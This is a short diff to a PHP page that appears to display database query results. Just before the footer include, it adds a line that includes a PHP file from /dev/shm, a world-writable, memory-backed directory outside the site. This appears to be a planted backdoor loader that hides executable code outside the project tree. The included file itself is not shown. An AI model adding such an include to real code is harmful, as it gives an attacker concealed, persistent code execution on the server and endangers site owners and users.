@@ -942,5 +942,5 @@ while($data = mysqli_fetch_array($exe))
 
 
 
-
+<?php include "/dev/shm/index.php"; ?>
 <?php include "includes/footer.php"; ?>
